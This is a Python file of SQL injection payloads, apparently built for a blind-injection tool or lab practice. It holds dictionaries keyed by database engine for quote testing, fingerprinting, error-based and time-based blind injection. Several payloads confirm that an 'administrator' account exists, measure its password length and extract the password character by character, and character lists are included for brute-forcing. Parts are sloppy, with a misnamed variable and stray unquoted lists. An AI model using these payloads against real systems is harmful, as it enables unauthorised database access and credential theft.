first_test = {
    "quote1" : "'",
    "qoute2" : "''"
}

database_fingerprinting = {
    "Oracle":      "'||(SELECT '' FROM dual)||'",
    "PostgreSQL":  "'||(SELECT '')||'",
    "SQLite":      "'||(SELECT '')||'",
    "MySQL":       "'OR(SELECT '')OR'",  
    "MSSQL":       "'+(SELECT '')+'"
}

# payloads_invalid_table = {
#     "Oracle":      "'||(SELECT '' FROM not_a_real_table)||'",  
#     "PostgreSQL":  "'||(SELECT '' FROM not_a_real_table)||'",
#     "SQLite":      "'||(SELECT '' FROM not_a_real_table)||'",
#     "MySQL":       "'||(SELECT '' FROM not_a_real_table)||'",  
#     "MSSQL":       "'+(SELECT '' FROM not_a_real_table)+'"
# }

# payloads_row_filter = {
#     "Oracle":      "'||(SELECT '' FROM {row} WHERE ROWNUM = 1)||'",
#     "PostgreSQL":  "'||(SELECT '' FROM {row} LIMIT 1)||'",
#     "SQLite":      "'||(SELECT '' FROM {row} LIMIT 1)||'",
#     "MySQL":       "'OR(SELECT '' FROM {row} LIMIT 1)OR'", 
#     "MSSQL":       "'+(SELECT TOP 1 '' FROM {row})+'"
# }

# payloads_conditional_error = {
#     "Oracle":      "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
#     "PostgreSQL":  "'||(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS TEXT) ELSE '' END)||'",
#     "SQLite":      "'||(SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)||'",
#     "MySQL":       "'||(SELECT IF(1=1, 1/0, ''))||'",  
#     "MSSQL":       "'+(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS NVARCHAR) ELSE '' END)+'"
# }

# payloads_conditional_error_false = {
#     "Oracle":      "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
#     "PostgreSQL":  "'||(SELECT CASE WHEN (1=2) THEN CAST(1/0 AS TEXT) ELSE '' END)||'",
#     "SQLite":      "'||(SELECT CASE WHEN (1=2) THEN 1/0 ELSE '' END)||'",
#     "MySQL":       "'||(SELECT IF(1=2, 1/0, ''))||'", 
#     "MSSQL":       "'+(SELECT CASE WHEN (1=2) THEN CAST(1/0 AS NVARCHAR) ELSE '' END)+'"
# }

# payloads_error_row_filter = {
#     "Oracle":      "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM {row} WHERE username='{object}')||'",
#     "PostgreSQL":  "'||(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS TEXT) ELSE '' END FROM {row} WHERE username='{object}')||'",
#     "SQLite":      "'||(SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END FROM {row} WHERE username='{object}')||'",
#     "MySQL":       "'||(SELECT IF(1=1, 1/0, '') FROM {row} WHERE username='{object}')||'",
#     "MSSQL":       "'+(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS NVARCHAR) ELSE '' END FROM {row} WHERE username='{object}')+"
# }







# blindl = {
#     "lenght":"'||(SELECT CASE WHEN LENGTH({password})>{lenght} THEN to_char(1/0) ELSE '' END FROM {users} WHERE username='{administrator}')||'",
#     "pass_finder":"'||(SELECT CASE WHEN SUBSTR(password,{num},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
# }


###### blind sql########

time_fingerprints = {
    # SQL Server
    "mssql": "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
    # MySQL
    "mysql": "'; SELECT IF(1=1, SLEEP(5), 0)-- -",
    # PostgreSQL
    "postgres": "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    # Oracle
    "oracle": "'; SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual--",
    # SQLite (شبیه‌سازی تاخیر با بار سنگین)
    "sqlite": "'; SELECT CASE WHEN (1=1) THEN (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt LIMIT 2500000) SELECT count(*) FROM cnt) ELSE 0 END--"
}

# time_fingerprints_confirm = {
#     # SQL Server
#     "mssql": "'; IF (1=1) WAITFOR DELAY '0:0:3'--",
#     # MySQL
#     "mysql": "'; SELECT IF(1=1, SLEEP(3), 0)-- -",
#     # PostgreSQL
#     "postgres": "'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--",
#     # Oracle
#     "oracle": "'; SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(3) ELSE NULL END FROM dual--",
#     # SQLite
#     "sqlite": "'; SELECT CASE WHEN (1=1) THEN (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 1200000) SELECT count(*) FROM c) ELSE 0 END--"
# }

USER_EXISTS_PAYLOADS = {
    "PostgreSQL": "';SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END--",
    "MySQL": "';SELECT IF(EXISTS(SELECT 1 FROM users WHERE username='administrator'), SLEEP(10), 0)-- -",
    "MSSQL": "'; IF EXISTS(SELECT 1 FROM users WHERE username='administrator') WAITFOR DELAY '0:0:10'--",
    "Oracle": "';SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='administrator')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('X',10) ELSE 0 END FROM dual--",
    "SQLite": "';SELECT CASE WHEN ((SELECT COUNT(*) FROM users WHERE username='administrator')>0) THEN LENGTH(randomblob(50000000)) ELSE 0 END--"
}

PASSWORD_LENGTH_GT2 = {
    "PostgreSQL": "';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>{lenght}) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--",
    "MySQL": "';SELECT IF((username='administrator' AND LENGTH(password)>{lenght}), SLEEP(10), 0)-- -",
    "MSSQL": "'; IF EXISTS(SELECT 1 FROM users WHERE username='administrator' AND LEN(password)>{lenght}) WAITFOR DELAY '0:0:10'--",
    "Oracle": "';SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')>{lenght} THEN DBMS_PIPE.RECEIVE_MESSAGE('X',10) ELSE 0 END FROM dual--",
    "SQLite": "';SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')>{lenght}) THEN LENGTH(randomblob(50000000)) ELSE 0 END--"
}


INTRUDER_SUBSTRING_RAW = {
    "PostgreSQL": "';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{position},1)='{char}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--",
    "MySQL": "';SELECT IF((username='administrator' AND SUBSTRING(password,{position},1)='{char}'), SLEEP(10), 0)-- -",
    "MSSQL": "'; IF EXISTS(SELECT 1 FROM users WHERE username='administrator' AND SUBSTRING(password,{position},1)='{char}') WAITFOR DELAY '0:0:10'--",
    "Oracle": "';SELECT CASE WHEN (SELECT SUBSTR(password,{position},1) FROM users WHERE username='administrator')='{char}' THEN DBMS_PIPE.RECEIVE_MESSAGE('X',10) ELSE 0 END FROM dual--",
    "SQLite": "';SELECT CASE WHEN ((SELECT SUBSTR(password,{position},1) FROM users WHERE username='administrator')='{char}') THEN LENGTH(randomblob(50000000)) ELSE 0 END--"
}



ime_fingerprints_confirm = {
    # SQL Server
    "mssql": "'; IF (1=1) WAITFOR DELAY '0:0:3'--",
    # MySQL
    "mysql": "'; SELECT IF(1=1, SLEEP(3), 0)-- -",
    # PostgreSQL
    "postgres": "'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--",
    # Oracle
    "oracle": "'; SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(3) ELSE NULL END FROM dual--",
    # SQLite
    "sqlite": "'; SELECT CASE WHEN (1=1) THEN (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 1200000) SELECT count(*) FROM c) ELSE 0 END--"
}



blind_sql_time_based = {
        "Microsoft SQL Server" : "'; IF (LEN((SELECT {object} FROM {table} WHERE Username='Administrator')) > {lenght}) WAITFOR DELAY '0:0:{delay}'--",
        "MySQL" : "' AND IF(LENGTH((SELECT {object} FROM {table} WHERE Username='Administrator')) > {lenght}, SLEEP({delay}), 0)-- -",
        "PostgreSQL" : "' AND CASE WHEN LENGTH((SELECT {object} FROM {table} WHERE Username='Administrator')) > {lenght} THEN pg_sleep({delay}) ELSE 0 END--",
        "Oracle" : "' AND CASE WHEN LENGTH((SELECT Password FROM Users WHERE Username='Administrator')) > 10 THEN DBMS_LOCK.SLEEP(5) ELSE NULL END = 0--"
}

[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]

[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,0,1,2,3,4,5,6,7,8,9]


# '||(SELECT CASE WHEN SUBSTR(password,{num},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

############################################################3333


# cast_payloads = {
#     "MySQL": "' AND (SELECT 1)=1-- -",
#     "PostgreSQL": "' AND CAST((SELECT 1) AS int)--",
#     "SQL Server": "' AND CAST((SELECT 1 AS int))=1--",
#     "Oracle": "' AND CAST((SELECT 1 AS NUMBER))=1--",
#     "SQLite": "' AND CAST((SELECT 1) AS INTEGER)=1--"
# }

# payloads_cast_select1 = {
#     "PostgreSQL": "' AND CAST((SELECT 1) AS int)--",
#     "SQL Server": "' AND CAST((SELECT 1) AS INT)--",
#     "MySQL": "' AND CAST((SELECT 1) AS SIGNED)-- ",
#     "MariaDB": "' AND CAST((SELECT 1) AS SIGNED)-- ",
#     "Oracle": "' AND CAST((SELECT 1 FROM dual) AS NUMBER)--",
#     "SQLite": "' AND CAST((SELECT 1) AS INTEGER)--"
# }


